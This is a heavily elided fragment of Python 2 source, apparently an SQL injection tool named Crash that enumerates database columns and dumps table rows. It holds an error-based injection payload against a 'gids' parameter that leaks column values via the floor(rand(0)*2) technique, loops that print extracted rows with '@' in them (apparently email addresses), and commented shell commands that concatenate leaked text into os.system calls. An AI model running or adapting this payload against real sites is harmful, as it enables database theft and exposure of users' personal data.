...
class Crash(object):
        ...
        for i in xrange(10):
            ...
            for i in xrange(1, 20):
                ...
                if column not in columns:
                    ...
                    print column
                    # os.popen('echo ' + '#'*100 + ' >> data.txt')
                    # os.system('echo ' + column + ' >> data.txt')
    ...
    def crash_data(self, database_table, prepare):
        ...
        # data = "gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(0x5e5e, (select substr(concat({columns}), 1, 147) from {database_table} limit {index},1), 0x5e5e, floor(rand(0)*2))x from information_schema.tables group by x)a)#"
        ...
        while True:
            ...
            if '@' in all_data and '00' not in all_data and '-' not in all_data:
                print all_data
                # os.system('echo ' + all_data + ' >> data.txt')
